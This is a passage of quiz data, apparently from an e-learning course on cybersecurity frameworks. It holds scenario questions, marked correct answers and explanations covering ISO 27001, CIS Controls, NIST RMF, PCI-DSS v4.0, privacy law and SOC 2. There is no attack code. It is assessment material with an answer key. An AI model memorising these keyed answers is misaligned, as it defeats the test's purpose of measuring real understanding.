        correctAnswer: 1,
        explanation: "The ISO 27001 certificate runs on a three-year cycle: Stage 1 (documentation readiness), Stage 2 (implementation effectiveness), then surveillance audits in years 1 and 2 sampling parts of the ISMS, and a full recertification audit before the three-year expiry."
      },
      {
        id: "cf-q3-7",
        difficulty: "medium",
        tags: ["Annex A 2022"],
        scenario: "A consultant's 2015-era checklist lists 114 controls in 14 domains. Your SoA template lists 93 controls in 4 themes with attributes such as #Preventive, #Confidentiality, #Governance.",
        question: "What accounts for the difference?",
        options: [
          "The SoA template is wrong and must be reverted to 114 controls",
          "ISO/IEC 27001:2022 restructured Annex A into 93 controls across 4 themes (Organisational, People, Physical, Technological) with attribute tagging, including 11 new controls",
          "The 93-control set applies only to cloud providers",
          "Attributes replaced the need for a Statement of Applicability"
        ],
        correctAnswer: 1,
        explanation: "The 2022 revision consolidated 114 controls into 93 across four themes and added 11 new controls including threat intelligence (5.7), cloud services (5.23), data masking (8.11), DLP (8.12) and web filtering (8.23). Attributes aid filtering and mapping; the SoA remains mandatory."
      },
      {
        id: "cf-q3-8",
        difficulty: "hard",
        tags: ["Evidence"],
        scenario: "An auditor asks for evidence that A.5.15 (access control) operates effectively. The team offers: the access control policy PDF, a screenshot of the IAM console, and a statement that reviews \"happen quarterly\".",
        question: "Why is this evidence insufficient?",
        options: [
          "Screenshots are never accepted as audit evidence",
          "It demonstrates design intent but not operating effectiveness — the auditor needs dated, signed review records with sampled populations and exception remediation over the period",
          "The policy PDF must be notarised",
          "Access control effectiveness cannot be audited"
        ],
        correctAnswer: 1,
        explanation: "Auditors test design AND operating effectiveness. A policy shows intent, a screenshot shows a point in time. Operating effectiveness needs a population, a sample, dated review artefacts with approver identity, and evidence that exceptions found were actually remediated across the audit period."
      }
    ]
  },
  {
    quizId: "cf-q4",
    courseId: "cybersecurity-frameworks",
    title: "CIS Controls v8 & Benchmarks in Practice",
    description: "Implementation Groups, safeguard prioritisation, and CIS Benchmark hardening decisions driven by real environments.",
    passingScore: 70,
    timeLimit: 20,
    questions: [
      {
        id: "cf-q4-1",
        difficulty: "medium",
        tags: ["Implementation Groups"],
        scenario: "Company profile: 35 employees, no full-time security staff, one IT generalist, handles customer contact data but no regulated data, limited budget.",
        question: "Which CIS Implementation Group applies, and what does it commit them to?",
        options: [
          "IG1 — the essential cyber hygiene baseline, roughly 56 foundational safeguards",
          "IG2 — because they process customer data of any kind",
          "IG3 — all 153 safeguards, since partial adoption is not permitted",
          "None — CIS Controls apply only to enterprises over 500 staff"
        ],
        correctAnswer: 0,
        explanation: "IG1 is defined for small organisations with limited expertise, protecting against unsophisticated commodity attacks — the essential cyber hygiene set. IG2 adds safeguards for organisations with dedicated security staff and regulated/sensitive data; IG3 targets organisations facing targeted attacks. Groups are cumulative: IG2 includes IG1."
      },
      {
        id: "cf-q4-2",
        difficulty: "easy",
        tags: ["Control Order"],
        scenario: "A new security lead proposes starting the programme with Control 13 (Network Monitoring and Defense) and Control 16 (Application Software Security), deferring Controls 1 and 2.",
        question: "Why is this ordering problematic?",
        options: [
          "Controls must be implemented in strict numeric order with no exceptions",
          "Controls 1 and 2 (inventory of enterprise assets and software) are prerequisites — you cannot monitor, patch or defend what you have not inventoried",
          "Control 13 is IG3-only and cannot be attempted first",
          "Controls 16 and 13 are deprecated in v8"
        ],
        correctAnswer: 1,
        explanation: "CIS orders controls by dependency and impact. Asset and software inventory (1 and 2) underpin vulnerability management, configuration, monitoring and response — every downstream control has blind spots proportional to inventory gaps. This is why they remain the first two controls."
      },
      {
        id: "cf-q4-3",
        difficulty: "hard",
        tags: ["Benchmarks", "Hardening"],
        scenario: "The team applies the CIS Benchmark Level 2 profile for Windows Server 2022 directly to production domain controllers on a Friday. Monday: legacy line-of-business app authentication fails, and an internal file share is unreachable.",
        question: "What was the process failure?",
        options: [
          "Level 2 benchmarks are defective and should never be used",
          "Level 2 is a defence-in-depth profile that can break functionality — it must be piloted in a test environment with exceptions documented before production rollout",
          "CIS Benchmarks can only be applied to workstations",
          "The team should have applied Level 3"
        ],
        correctAnswer: 1,
        explanation: "CIS Benchmark Level 1 targets broad, low-impact hardening; Level 2 adds stricter defence-in-depth settings that frequently break legacy applications. Sound practice: baseline in a lab, pilot on a representative ring, document approved exceptions with compensating controls, then stage production — never a direct Friday push to domain controllers."
      },
      {
        id: "cf-q4-4",
        difficulty: "medium",
        tags: ["Safeguards", "Mapping"],
        scenario: "Post-incident, phishing led to credential theft and reuse across three SaaS apps with no MFA. Leadership asks which CIS safeguards would most directly have prevented or contained this.",
        question: "Which pairing is the strongest answer?",
        options: [
          "Control 5/6 (Account and Access Management — MFA, unique credentials) plus Control 14 (Security Awareness Training)",
          "Control 11 (Data Recovery) plus Control 12 (Network Infrastructure Management)",
          "Control 3 (Data Protection) plus Control 15 (Service Provider Management) only",
          "Control 18 (Penetration Testing) alone"
        ],
        correctAnswer: 0,
        explanation: "Credential theft plus reuse is answered by account management and access control safeguards — enforce MFA on all externally accessible and administrative accounts, unique credentials, and centralised identity — reinforced by awareness training to reduce initial click-through. Recovery and pen testing matter but neither prevents or contains this chain."
      },
      {
        id: "cf-q4-5",
        difficulty: "medium",
        tags: ["Measurement"],
        scenario: "Two metrics are proposed to the board for Control 7 (Continuous Vulnerability Management):\n  M1: \"We ran 12 scans this quarter.\"\n  M2: \"Median time to remediate internet-facing critical vulnerabilities: 6 days; 94% within 14-day SLA.\"",
        question: "Which metric is meaningful and why?",
        options: [
          "M1 — scan volume proves programme activity",
          "M2 — it measures outcome against a risk-based SLA rather than activity",
          "Both are equivalent measures of the same control",
          "Neither; vulnerability management cannot be measured quantitatively"
        ],
        correctAnswer: 1,
        explanation: "M1 is an activity metric — running scans says nothing about risk reduction. M2 measures outcome (time-to-remediate) scoped to the highest-risk population (internet-facing critical) against a defined SLA, which is what CIS safeguard measures and board reporting should reflect."
      },
      {
        id: "cf-q4-6",
        difficulty: "hard",
        tags: ["IG2/IG3"],
        scenario: "A 4,000-person biotech with a dedicated SOC and IP that nation-state actors have previously targeted asks whether IG2 is sufficient.",
        question: "What is the appropriate recommendation?",
        options: [
          "IG2 is sufficient — IG3 applies only to government agencies",
          "IG3, because the organisation faces targeted, sophisticated adversaries; IG3 adds safeguards such as advanced penetration testing, red teaming and deeper application security",
          "IG1, because the SOC already provides monitoring",
          "Implementation Groups do not apply once an organisation exceeds 1,000 staff"
        ],
        correctAnswer: 1,
        explanation: "IG selection is driven by threat profile and data sensitivity, not sector. A documented history of targeting by sophisticated actors plus high-value IP places the organisation in IG3, which layers advanced testing, exercise and application-security safeguards on top of the cumulative IG1+IG2 set."
      },
      {
        id: "cf-q4-7",
        difficulty: "easy",
        tags: ["Benchmarks vs Controls"],
        scenario: "An engineer conflates two CIS artefacts: one tells the organisation to \"establish and maintain secure configuration of enterprise assets\", the other gives a 900-page settings list for Ubuntu 22.04.",
        question: "Which is which?",
        options: [
          "The first is a CIS Control/safeguard (what to achieve); the second is a CIS Benchmark (platform-specific how)",
          "The first is a Benchmark; the second is a safeguard",
          "Both are Benchmarks at different levels",
          "Both are safeguards under Control 4"
        ],
        correctAnswer: 0,
        explanation: "CIS Controls and their safeguards state the outcome (Control 4: Secure Configuration). CIS Benchmarks are the prescriptive, platform-specific configuration guides — Windows, Linux distributions, browsers, Kubernetes, cloud providers — that operationalise those outcomes."
      },
      {
        id: "cf-q4-8",
        difficulty: "medium",
        tags: ["Exceptions"],
        scenario: "A benchmark item requires disabling SMBv1. One legacy medical imaging device requires SMBv1 and the vendor will not patch until 2027.",
        question: "What is the correct handling?",
        options: [
          "Disable SMBv1 everywhere and accept the clinical outage",
          "Silently skip the benchmark item across the estate to keep the device working",
          "Enforce the setting estate-wide, grant a documented, time-bound exception for that device with compensating controls (isolated VLAN, strict ACLs, enhanced monitoring) and a review date",
          "Mark Control 4 as not applicable in the SoA"
        ],
        correctAnswer: 2,
        explanation: "Exception management is the mechanism: keep the baseline enforced everywhere it can be, isolate the non-conforming asset, add compensating detection, record the risk owner, and set a review/expiry date tied to the vendor roadmap. Skipping estate-wide converts one device's constraint into an organisation-wide vulnerability."
      }
    ]
  },
  {
    quizId: "cf-q5",
    courseId: "cybersecurity-frameworks",
    title: "Risk Management: RMF, Assessment & Third Parties",
    description: "NIST RMF steps, quantitative vs qualitative analysis, treatment decisions, and vendor risk scenarios.",
    passingScore: 70,
    timeLimit: 20,
    questions: [
      {
        id: "cf-q5-1",
        difficulty: "medium",
        tags: ["NIST RMF"],
        scenario: "A federal system team completed: categorised the system per FIPS 199, selected a control baseline, and implemented the controls. The AO is now asking what must occur before the system may operate.",
        question: "Which RMF steps remain, in order?",
        options: [
          "Assess, Authorize, Monitor",
          "Monitor, Assess, Authorize",
          "Prepare, Select, Monitor",
          "Authorize, Assess, Categorize"
        ],
        correctAnswer: 0,
        explanation: "RMF sequence is Prepare, Categorize, Select, Implement, Assess, Authorize, Monitor. With implementation complete, an independent assessment produces the SAR, the Authorizing Official grants an ATO based on residual risk, and continuous monitoring sustains the authorisation."
      },
      {
        id: "cf-q5-2",
        difficulty: "hard",
        tags: ["Quantitative Risk"],
        scenario: "Asset value (AV) of the customer database: $4,000,000\nExposure factor (EF) for a ransomware event: 25%\nAnnual rate of occurrence (ARO): 0.4\nProposed control: immutable backup + segmentation, $150,000/yr, reduces ARO to 0.1",
        question: "What is the ALE before and after, and is the control justified?",
        options: [
          "ALE before $400K, after $100K — saving $300K for $150K spend, so justified",
          "ALE before $1M, after $400K — not justified",
          "ALE before $400K, after $250K — marginal",
          "ALE cannot be calculated without the SLE"
        ],
        correctAnswer: 0,
        explanation: "SLE = AV x EF = $4M x 0.25 = $1M. ALE = SLE x ARO = $1M x 0.4 = $400K. After the control, ALE = $1M x 0.1 = $100K. Risk reduction is $300K per year against a $150K annual cost — a positive $150K net benefit, so the control is financially justified."
      },
      {
        id: "cf-q5-3",
        difficulty: "medium",
        tags: ["Qualitative vs Quantitative"],
        scenario: "Two reports land on the CFO's desk for the same risk:\n  R1: \"Reputational damage from a breach: HIGH severity, MEDIUM likelihood.\"\n  R2: \"Expected annual loss $2.3M (90% CI: $0.8M-$5.1M) based on 10,000 Monte Carlo iterations.\"",
        question: "Which is the correct characterisation of these two approaches?",
        options: [
          "R1 is quantitative and R2 is qualitative",
          "R1 is qualitative — fast and comparative but not directly usable for financial trade-offs; R2 is quantitative — supports cost-benefit decisions but needs credible input data",
          "R2 is always superior and R1 should never be used",
          "They are the same method expressed differently"
        ],
        correctAnswer: 1,
        explanation: "Qualitative (H/M/L) is quick, good for triage and broad coverage, but cannot be summed or compared to control cost. Quantitative (FAIR, Monte Carlo) produces loss distributions usable for budget decisions, at the cost of data quality dependence and effort. Mature programmes use qualitative to triage and quantitative on the top risks."
      },
      {
        id: "cf-q5-4",
        difficulty: "hard",
        tags: ["Third-Party Risk"],
        scenario: "Vendor intake queue:\n  V1: marketing analytics SaaS, read-only access to anonymised web metrics\n  V2: payroll processor, holds employee PII and bank details, integrated via SFTP\n  V3: office snack supplier, no system access\n  V4: managed IT provider with domain admin credentials into your estate",
        question: "How should the tiering and assurance depth be assigned?",
        options: [
          "All four get the same 200-question security questionnaire for fairness",
          "V4 and V2 are critical/high (privileged access, sensitive data) requiring SOC 2 Type II or ISO evidence, contractual security schedules and periodic reassessment; V1 is moderate/lightweight; V3 is out of scope",
          "V1 is highest risk because it is cloud-hosted",
          "Tiering should follow annual contract value only"
        ],
        correctAnswer: 1,
        explanation: "Third-party risk is tiered by data sensitivity, access level and business criticality — not contract value or hosting model. Privileged administrative access (V4) is the highest inherent risk, followed by the sensitive-PII processor (V2). Uniform questionnaires waste effort on V3 and under-scrutinise V4."
      },
      {
        id: "cf-q5-5",
        difficulty: "medium",
        tags: ["Risk Acceptance"],
        scenario: "Acceptance record:\n  Risk: unsupported Windows Server 2012 R2 running a billing app\n  Accepted by: Head of Infrastructure\n  Expiry: none stated\n  Compensating controls: none listed\n  Value at risk: $1.8M (exceeds the $400K per-risk tolerance)",
        question: "Identify the three defects in this acceptance.",
        options: [
          "It is accepted above tolerance, by a non-business risk owner, with no expiry or compensating controls",
          "Only the missing expiry date is a defect",
          "Nothing is wrong — any manager may accept a risk they understand",
          "The defect is that unsupported software can never be accepted under any circumstances"
        ],
        correctAnswer: 0,
        explanation: "A valid acceptance requires: approval by the accountable business risk owner at the authority level matching the exposure (this exceeds tolerance, so it should escalate to executive/board level), a documented expiry and review date, and compensating controls that reduce exposure while the risk stands. All three are absent."
      },
      {
        id: "cf-q5-6",
        difficulty: "easy",
        tags: ["Inherent vs Residual"],
        scenario: "Register entry: Inherent risk 20 (High). Controls: MFA, network segmentation, EDR. Residual risk 6 (Low). The board asks which number determines whether further action is needed.",
        question: "Which is correct?",
        options: [
          "Residual risk — it reflects exposure after existing controls and is compared against appetite/tolerance",
          "Inherent risk — it is the worst case and therefore the decision basis",
          "The average of the two",
          "Neither; only qualitative ratings can inform board decisions"
        ],
        correctAnswer: 0,
        explanation: "Inherent risk shows how much the control set is doing (useful for justifying continued investment), but treatment decisions are made against residual risk versus appetite and tolerance. Here residual 6 is within a Low band, so monitoring rather than further treatment is appropriate."
      },
      {
        id: "cf-q5-7",
        difficulty: "hard",
        tags: ["Concentration Risk"],
        scenario: "Vendor review shows your primary CRM, your ticketing system, your identity provider and your backup target all run in a single cloud provider's single region. Each vendor individually passed its assessment.",
        question: "What risk is missed by per-vendor assessment, and what treatment fits?",
        options: [
          "No risk — each vendor was assessed and passed",
          "Concentration/systemic risk — a single provider or region outage cascades across critical functions; treat with multi-region or multi-provider design, tested failover, and contractual RTO commitments",
          "Supply-chain risk is only relevant to hardware manufacturers",
          "Insurance is the only viable treatment"
        ],
        correctAnswer: 1,
        explanation: "Assessing vendors one at a time hides correlated failure. Aggregating dependencies across the portfolio exposes single points of failure — here, one region hosting identity, backup and core business systems means an outage removes both operation and recovery. Treatment is architectural (diversify, test failover) plus contractual RTO/RPO terms."
      },
      {
        id: "cf-q5-8",
        difficulty: "medium",
        tags: ["Continuous Monitoring"],
        scenario: "An ATO was granted 14 months ago. Since then the system added a public API, changed cloud regions, and had two Poor scan results go unreviewed. No reassessment has occurred.",
        question: "Which RMF step is failing?",
        options: [
          "Step 7 — Monitor: ongoing control assessment, change management and status reporting to the AO must keep the authorisation current",
          "Step 2 — Categorize",
          "Step 4 — Implement",
          "Step 1 — Prepare"
        ],
        correctAnswer: 0,
        explanation: "RMF is a lifecycle, not a one-time gate. Step 7 (Monitor) requires ongoing assessment of control effectiveness, security impact analysis of changes such as a new public API or region move, and reporting to the AO — who may withdraw or condition the ATO if residual risk drifts."
      }
    ]
  },
  {
    quizId: "cf-q6",
    courseId: "cybersecurity-frameworks",
    title: "PCI-DSS v4.0: Scoping, Segmentation & Audit",
    description: "Cardholder data environment scoping, SAQ selection, segmentation validation and v4.0 requirement changes.",
    passingScore: 70,
    timeLimit: 20,
    questions: [
      {
        id: "cf-q6-1",
        difficulty: "hard",
        tags: ["Scoping", "CDE"],
        scenario: "Network map:\n  VLAN 10 — POS terminals, process card data (CDE)\n  VLAN 20 — jump host used by admins to manage VLAN 10\n  VLAN 30 — corporate laptops, no route to VLAN 10\n  VLAN 40 — Active Directory serving authentication to VLAN 10 and 20",
        question: "Which VLANs are in PCI scope?",
        options: [
          "VLAN 10 only",
          "VLAN 10, 20 and 40 — the CDE plus connected-to/security-impacting systems (jump host and the AD that authenticates into the CDE)",
          "All four VLANs, because they share the same physical infrastructure",
          "VLAN 10 and 30"
        ],
        correctAnswer: 1,
        explanation: "Scope covers the CDE plus any system that connects to it or could impact its security. The admin jump host is connected-to; Active Directory authenticating CDE systems is security-impacting. VLAN 30 stays out only if segmentation genuinely prevents any route into the CDE — which must be tested, not assumed."
      },
      {
        id: "cf-q6-2",
        difficulty: "medium",
        tags: ["Segmentation Testing"],
        scenario: "The QSA asks how the merchant validated that VLAN 30 is out of scope. Answer: \"We reviewed the firewall rule export and the rules look correct.\"",
        question: "Why is this insufficient under PCI-DSS?",
        options: [
          "Firewall exports must be provided in PDF form",
          "Segmentation must be validated by penetration testing at least annually (and after significant changes) — rule review alone does not prove isolation",
          "Segmentation is not permitted to reduce scope under v4.0",
          "Only the acquirer may validate segmentation"
        ],
        correctAnswer: 1,
        explanation: "PCI-DSS requires segmentation effectiveness to be confirmed by penetration testing at least annually and after any significant change to segmentation controls (every six months for service providers). Configuration review can miss misconfigured routes, shared management planes, and forgotten rules."
      },
      {
        id: "cf-q6-3",
        difficulty: "medium",
        tags: ["SAQ"],
        scenario: "An e-commerce merchant fully outsources payment capture: the checkout redirects to the processor's hosted page and the merchant's servers never see or transmit card data.",
        question: "Which SAQ type generally applies?",
        options: [
          "SAQ A — the smallest question set, for merchants who fully outsource all cardholder data functions to validated third parties",
          "SAQ D — the full set, required for all e-commerce merchants",
          "SAQ B — for imprint machines and standalone dial-out terminals",
          "SAQ C-VT — for virtual terminal only"
        ],
        correctAnswer: 0,
        explanation: "SAQ A applies to card-not-present merchants who have fully outsourced all cardholder data functions, with no electronic storage, processing or transmission on their systems. Note v4.0 tightened SAQ A with script-integrity and page-tampering expectations because of Magecart-style attacks on the merchant's own page."
      },
      {
        id: "cf-q6-4",
        difficulty: "hard",
        tags: ["v4.0 Changes"],
        scenario: "A compliance lead compares v3.2.1 evidence with v4.0 requirements and finds gaps around: password length, MFA coverage, automated log review, and payment page script inventory.",
        question: "Which statement about v4.0 is accurate?",
        options: [
          "v4.0 reduced password minimums to 7 characters and removed MFA requirements",
          "v4.0 raised passwords to 12 characters minimum, extended MFA to all access into the CDE (not just admin/remote), added targeted risk analyses, and required inventory/integrity monitoring of payment page scripts",
          "v4.0 removed the need for log review entirely in favour of annual attestation",
          "v4.0 applies only to service providers"
        ],
        correctAnswer: 1,
        explanation: "Key v4.0 shifts: 12-character passwords, MFA for all access into the CDE, the customised approach option supported by targeted risk analyses, automated log-review mechanisms, and requirements 6.4.3/11.6.1 covering payment page scripts and change/tamper detection — a direct response to e-skimming."
      },
      {
        id: "cf-q6-5",
        difficulty: "medium",
        tags: ["Storage Rules"],
        scenario: "A database schema review of the order table finds these columns populated: PAN (encrypted), cardholder name, expiry date, service code, CVV2 (encrypted), and the full track 2 data (encrypted).",
        question: "Which columns violate PCI-DSS regardless of encryption?",
        options: [
          "PAN and expiry date",
          "CVV2 and full track data — sensitive authentication data must never be stored after authorisation, even encrypted",
          "Cardholder name only",
          "None — encryption makes all storage compliant"
        ],
        correctAnswer: 1,
        explanation: "Sensitive Authentication Data (full track data, CAV2/CVC2/CVV2/CID, PINs/PIN blocks) must never be retained post-authorisation, encrypted or not. PAN may be stored if rendered unreadable (truncation, tokenisation, strong crypto with key management); name, expiry and service code may be stored subject to protection requirements."
      },
      {
        id: "cf-q6-6",
        difficulty: "easy",
        tags: ["Compliance Levels"],
        scenario: "A merchant processes about 8 million Visa transactions annually and asks what validation it must undergo.",
        question: "What is the correct answer?",
        options: [
          "Level 1 — annual onsite assessment by a QSA (or internal auditor with officer sign-off) plus quarterly ASV scans",
          "Level 4 — annual SAQ only",
          "Level 2 — SAQ plus optional scanning",
          "No validation required for merchants above 5 million transactions"
        ],
        correctAnswer: 0,
        explanation: "Level 1 is over 6 million transactions per brand per year (or any merchant that has suffered a breach, or is designated by a brand). It requires an annual Report on Compliance from a QSA or qualified internal auditor with officer attestation, plus quarterly external ASV scans."
      },
      {
        id: "cf-q6-7",
        difficulty: "hard",
        tags: ["Compensating Controls"],
        scenario: "A legacy terminal cannot support the required TLS version. The team proposes a compensating control: place the terminal on a dedicated VLAN with an IPsec tunnel to the processor, restrict by MAC and IP ACL, and log all sessions with daily review.",
        question: "What must the compensating control worksheet demonstrate for a QSA to accept this?",
        options: [
          "That the control is cheaper than remediating the terminal",
          "That there is a documented legitimate constraint, the control meets the intent and rigour of the original requirement, provides a comparable level of defence, and goes above and beyond other PCI requirements",
          "Only that the risk owner signed it",
          "That the terminal will be replaced within five years"
        ],
        correctAnswer: 1,
        explanation: "A compensating control must document the business/technical constraint, meet the intent and rigour of the original requirement, provide comparable defence, and exceed other PCI requirements (a control already required elsewhere cannot double as compensation). It is reassessed annually and is not a permanent exemption."
      },
      {
        id: "cf-q6-8",
        difficulty: "medium",
        tags: ["Scope Reduction"],
        scenario: "Leadership wants to cut audit cost. Options: (A) tokenise PANs so the merchant systems only ever hold tokens, (B) add more firewalls inside the CDE, (C) buy cyber insurance, (D) shorten log retention.",
        question: "Which option genuinely reduces PCI scope?",
        options: [
          "A — tokenisation removes PAN from merchant systems, shrinking the CDE and the systems subject to assessment",
          "B — more firewalls always reduce scope",
          "C — insurance transfers cost, which reduces assessment burden",
          "D — less log data means fewer requirements to assess"
        ],
        correctAnswer: 0,
        explanation: "Scope is defined by where cardholder data lives, flows and can be reached. Removing the PAN itself (tokenisation, P2PE, hosted payment pages) is the only lever here that shrinks the CDE. Extra internal firewalls may improve security without reducing scope; insurance is irrelevant to scope; reducing retention below requirement 10 minimums is a violation."
      }
    ]
  },
  {
    quizId: "cf-q7",
    courseId: "cybersecurity-frameworks",
    title: "Privacy Regulation: GDPR, HIPAA, CCPA & DPIAs",
    description: "Lawful basis, breach notification clocks, cross-regulation differences, and when a DPIA is mandatory.",
    passingScore: 70,
    timeLimit: 20,
    questions: [
      {
        id: "cf-q7-1",
        difficulty: "hard",
        tags: ["GDPR", "Breach Notification"],
        scenario: "Timeline:\n  Tue 09:00 — SOC detects anomalous export from the customer database\n  Wed 16:30 — IR confirms 120,000 EU records (name, email, hashed password, home address) were exfiltrated\n  Thu 11:00 — Legal begins drafting notification",
        question: "When does the 72-hour GDPR clock start, and what is the deadline?",
        options: [
          "At detection (Tue 09:00) — deadline Fri 09:00",
          "At awareness of the personal data breach (Wed 16:30, when it was confirmed) — supervisory authority notification due by Sat 16:30",
          "At the start of legal drafting (Thu 11:00)",
          "There is no deadline if the passwords were hashed"
        ],
        correctAnswer: 1,
        explanation: "Art. 33 requires notification to the supervisory authority without undue delay and where feasible within 72 hours of becoming aware — awareness means reasonable certainty a personal data breach occurred, i.e. Wed 16:30. Notification may be phased if all facts are not yet known. Data subjects must also be told if high risk to their rights exists (Art. 34)."
      },
      {
        id: "cf-q7-2",
        difficulty: "medium",
        tags: ["Lawful Basis"],
        scenario: "A retailer wants to email past customers about new products. It relies on \"legitimate interests\" and provides an unsubscribe link. A separate proposal is to use the same customer data to train a third-party ad-targeting model.",
        question: "Which assessment is correct?",
        options: [
          "Both uses are covered by legitimate interests since the data was lawfully collected",
          "Direct marketing to existing customers can rest on legitimate interests (subject to an LIA, transparency and opt-out), but sharing data for third-party ad targeting is a materially different purpose likely requiring consent and a purpose-compatibility assessment",
          "Consent is required for both, always",
          "Neither requires a lawful basis because the customers already transacted"
        ],
        correctAnswer: 1,
        explanation: "Lawful basis is per purpose, not per dataset. Recital 47 recognises direct marketing as a possible legitimate interest with a balancing test and opt-out (plus ePrivacy rules on electronic marketing). Repurposing for third-party ad targeting fails compatibility and reasonable-expectation tests, pushing you to consent."
      },
      {
        id: "cf-q7-3",
        difficulty: "medium",
        tags: ["HIPAA"],
        scenario: "A hospital contracts a cloud transcription service that processes recorded physician dictations containing patient identifiers.",
        question: "What must be in place, and what is the vendor's status?",
        options: [
          "Nothing extra — cloud vendors are exempt as conduits",
          "The vendor is a Business Associate; a Business Associate Agreement is required and the vendor is directly liable for Security Rule compliance",
          "The vendor is a Covered Entity and must file its own NPP",
          "Only a standard NDA is required"
        ],
        correctAnswer: 1,
        explanation: "A service that creates, receives, maintains or transmits PHI on behalf of a covered entity is a Business Associate, requiring a BAA. The narrow conduit exception covers mere transmission (like a courier or ISP) without persistent access. Since HITECH, BAs are directly liable for Security Rule requirements and breach notification to the CE."
      },
      {
        id: "cf-q7-4",
        difficulty: "hard",
        tags: ["DPIA"],
        scenario: "Proposed project: AI-driven video analytics across all store entrances, performing facial recognition to flag previously identified shoplifters, operating continuously in eight EU countries.",
        question: "Is a DPIA required, and what triggers apply?",
        options: [
          "No — DPIAs are optional under GDPR",
          "Yes — systematic monitoring of a publicly accessible area on a large scale, plus processing of biometric special-category data and use of innovative technology; multiple Art. 35(3) triggers apply",
          "Only if a data subject complains",
          "Only if the data leaves the EU"
        ],
        correctAnswer: 1,
        explanation: "Art. 35(3) makes a DPIA mandatory for systematic and extensive evaluation, large-scale special-category processing (biometrics), and systematic large-scale monitoring of publicly accessible areas. This project hits all three. If residual high risk remains after mitigation, Art. 36 prior consultation with the supervisory authority is required."
      },
      {
        id: "cf-q7-5",
        difficulty: "medium",
        tags: ["CCPA/CPRA"],
        scenario: "A California resident submits a request asking a data broker to stop selling their information and to delete what has been collected. The broker replies that it will comply only if the consumer creates an account and verifies via a paid identity service.",
        question: "What is wrong with the response?",
        options: [
          "Nothing — verification is always at the business's discretion",
          "A business cannot require account creation to submit a request, must provide at least two designated methods, cannot charge for exercising rights, and must honour opt-out of sale/sharing including Global Privacy Control signals",
          "CCPA has no deletion right, only access",
          "The request is invalid because data brokers are exempt"
        ],
        correctAnswer: 1,
        explanation: "CCPA/CPRA prohibits requiring account creation, mandates multiple submission methods, forbids charging or discriminating against consumers who exercise rights, and requires honouring opt-out preference signals such as GPC. Reasonable verification is permitted, but it cannot become a paywall or an account requirement."
      },
      {
        id: "cf-q7-6",
        difficulty: "hard",
        tags: ["Comparison"],
        scenario: "A US health-tech company serving both US and EU patients asks: which single privacy compliance effort will satisfy everything?",
        question: "What is the correct guidance?",
        options: [
          "GDPR compliance automatically satisfies HIPAA and CCPA",
          "No single regime suffices — GDPR is comprehensive and consent/lawful-basis driven, HIPAA is sector-specific to PHI with its own breach rules, CCPA/CPRA is a consumer-rights regime with sale/sharing opt-outs; controls overlap but obligations differ",
          "HIPAA is the strictest, so HIPAA compliance covers the rest",
          "CCPA compliance covers EU residents if they shop online"
        ],
        correctAnswer: 1,
        explanation: "The regimes differ in scope, triggers and remedies: GDPR applies extraterritorially to EU data subjects with lawful-basis and 72-hour rules; HIPAA governs PHI held by covered entities/BAs with a 60-day individual notification rule; CCPA/CPRA grants opt-out of sale/sharing to California consumers. A unified control framework helps, but obligations must be mapped individually."
      },
      {
        id: "cf-q7-7",
        difficulty: "easy",
        tags: ["Data Minimisation"],
        scenario: "A signup form for a newsletter collects: email, full name, date of birth, home address, gender, and employer.",
        question: "Which GDPR principle is most clearly at risk?",
        options: [
          "Data minimisation — only data adequate, relevant and limited to the newsletter purpose should be collected",
          "Integrity and confidentiality",
          "Accuracy",
          "Accountability"
        ],
        correctAnswer: 0,
        explanation: "Art. 5(1)(c) requires personal data to be adequate, relevant and limited to what is necessary for the purpose. A newsletter needs an email address; date of birth, home address, gender and employer are excess collection that also expands breach impact and retention obligations."
      },
      {
        id: "cf-q7-8",
        difficulty: "medium",
        tags: ["Controller vs Processor"],
        scenario: "Company A decides which customer data to collect and why. Company B hosts and processes it strictly per A's documented instructions. Company B then begins using aggregate customer data to build its own analytics product without A's instruction.",
        question: "What changes for Company B?",
        options: [
          "Nothing — processors may use data they hold",
          "By determining its own purpose, B becomes a controller for that processing, taking on full controller obligations and liability, and is in breach of Art. 28 by acting outside documented instructions",
          "B becomes a joint controller with A automatically for all processing",
          "B is now exempt from GDPR as an aggregator"
        ],
        correctAnswer: 1,
        explanation: "Controller status follows who determines purposes and means. Art. 28(10) states that a processor which determines purposes for processing is considered a controller for that processing. B is simultaneously in breach of the processing agreement, which requires acting only on documented instructions."
      }
    ]
  },
  {
    quizId: "cf-q8",
    courseId: "cybersecurity-frameworks",
    title: "SOC 2 & Cloud Security Frameworks",
    description: "Trust Services Criteria, Type I vs Type II evidence, exceptions, and cloud shared-responsibility scenarios.",
    passingScore: 70,
    timeLimit: 20,
    questions: [
      {
        id: "cf-q8-1",
        difficulty: "medium",
        tags: ["SOC 2", "Type I vs II"],
        scenario: "A prospect demands assurance that your controls actually worked over the past year, not just that they exist today. Your last report covered controls \"as of 31 December\".",
        question: "What do you have, and what do they want?",
        options: [
          "You have a Type II; they want a Type I",
          "You have a Type I (design at a point in time); they want a Type II (design and operating effectiveness over a period, typically 3-12 months)",
          "You have an ISO 27001 certificate; they want a SOC 1",
          "Both types are point-in-time; the difference is scope"
        ],
        correctAnswer: 1,
        explanation: "Type I attests to the suitability of control design at a specified date. Type II tests operating effectiveness across a review period, with sampling and exception reporting — which is what enterprise buyers require. Many companies issue a Type I first, then a Type II covering the following period."
      },
      {
        id: "cf-q8-2",
        difficulty: "hard",
        tags: ["Trust Services Criteria"],
        scenario: "A payments-adjacent SaaS is deciding scope. Customers care about uptime commitments in the SLA, accuracy of transaction records, and protection of customer PII. The company also handles no health data.",
        question: "Which TSC selection is most appropriate?",
        options: [
          "Security only, since it is the mandatory common criteria",
          "Security (required) plus Availability, Processing Integrity and Confidentiality/Privacy as driven by the SLA, transaction accuracy needs and PII handling",
          "All five criteria always, regardless of the service",
          "Privacy only, because PII is involved"
        ],
        correctAnswer: 1,
        explanation: "Security (the common criteria) is mandatory; the other four are elective and should be chosen to match customer commitments. SLA uptime maps to Availability, transaction accuracy to Processing Integrity, PII protection to Confidentiality and/or Privacy. Adding unnecessary criteria increases cost and exception exposure."
      },
      {
        id: "cf-q8-3",
        difficulty: "medium",
        tags: ["Exceptions"],
        scenario: "Your Type II report contains one exception: in 2 of 25 sampled terminations, access was revoked on day 4 rather than within the committed 24 hours. Management response documents root cause and an automated deprovisioning fix.",
        question: "How should this be interpreted?",
        options: [
          "The report is a failure and cannot be shared with customers",
          "An exception is not automatically a qualified opinion — it is a tested deviation; the auditor forms an opinion on whether controls were effective overall, and the management response matters to reviewers",
          "Exceptions are removed from the final report before issuance",
          "Two exceptions out of 25 automatically means an adverse opinion"
        ],
        correctAnswer: 1,
